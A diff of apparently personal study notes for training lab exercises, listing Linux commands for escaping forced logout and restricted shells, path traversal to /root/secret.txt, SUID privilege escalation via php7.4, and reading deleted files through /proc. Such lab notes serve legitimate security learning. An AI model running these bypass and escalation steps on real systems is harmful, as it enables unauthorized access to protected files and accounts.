@@ -1,44 +1,42 @@
-Kali commands useful for completing tasks for BSI:
-TOPIC: Bypassing basic mechanisms of user block
+Kali commands useful for completing tasks from BSI:
+TOPIC: [LINUX] Bypassing basic mechanisms of user block
 
-Automatic logout:
-On the server, in the user’s home directory, a file secret.txt was placed which includes the task solution. However, as a result of the file .bash_rc modification, after logging in, the user is automatically logged out. Find a way and read the file content and provide the task solution.
-[sftp user@host -> based on the ssh protoccol, allows secure connection to transfer files]
-ssh -l alice 10.0.42.158 "ls"
-ssh -l alice 10.0.42.158 "cat secret.txt"
-ssh -l alice 10.0.42.158 -t "sh -i" [interactive mode]
+task_1: Automatic logout
+ssh -l USER IP "COMMAND" (execute COMMAND right after connecting to the server - in case the server has limited active time)
 
-Access to files in the /root folder:
-On the server there is a file secret.txt in the folder /root whose owner is the root account. The task is to read the content of the file which includes the solution. To solve this exercise, you can use one of the user’s home directory files.
-.file
-/root/secret.txt
+task_2: Access to files in the /root folder
+(one-liner)
+ssh -l USER IP "archive/file"
+...
 
+task_3: Access to files belonging to the root user
+(one-liner)
+ssh -l USER IP "archive/file"
+...
+'file to read': ../root/secret.txt
 
-Access to files belonging to the root user:
-On the server there is a file secret.txt in the folder /root whose owner is root. The task is to read the content of the file with the solution.
-To solve the task you can use one of the files in the user’s home directory which allows to read files from the folder /tmp and is prone to a Path Traversal attack.
-./file
-../root/secret.txt
+task_4: User privilege escalation
+ssh -l USER IP
+...
+find / -perm /6000 2>/dev/null (find files with the 's-bit' set - allowing non-root users to execute the files with root privileges)
+php7.4 -f /root/secret.txt (parse and execute file secret.txt using php7.4 script)
+(one-liner)
+ssh -l USER IP "php7.4 /root/secret.txt"
 
-User privilege escalation:
-On the server there is a file secret.txt in the folder /root whose owner is root. The task is to read the content of the file including the solution.
-In order to solve the task, use one of the programs with SUID permissions to escalate privileges to the root account.
-find / -perm /6000 2>/dev/null
-php7.4 -f /root/secret.txt
+task_5: Shell other than Bash
+ssh -l USER IP
+ssh -l bob localhost -i .ssh/bob_key.pem (log into localhost as 'bob' user providing bob's private key)
+['man more' and find 'v' option]
+:e FILE (when editor is opened, ':e FILE' opens a FILE for edit)
 
-Shell other than Bash:
-After logging in through SSH you need to log in to the account of user bob, however, after logging in to bob's account, shell other than Bash gets launched.
-Identify what shell this is, exit it to Bash shell, and read the file from the home directory of user bob with the task solution.
-cat /etc/passwd
---
-cd /.ssh
-ssh -l bob localhost -i bob_key.pem
-v
-:e secret.txt
-
-Deleted file:
-In your home directory there is a program file.py (written in Python) which reads the file with the solution to the task. Unfortunately, it has been deleted, but it is still running in the background.
-Your task is to read the content of the file containing the task solution.
-ps aux
-ps -x
-cat ./3
+task_6: Deleted file
+ssh -l USER IP
+ps aux (display all informations about running processes)
+ps -x (display processes for the current user)
+ls /proc/PID (display the data related to the process identified by PID number)
+ls /proc/PID/fd (file descriptors of process with the given PID)
+cat /proc/PID/fd/DESC (display the contents of the descriptor identified by DESC number)
+(double one-liner?)
+ssh -l USER IP "ps -x"
+[copy PID of the specific process]
+ssh -l USER IP "cat /proc/189/fd/3
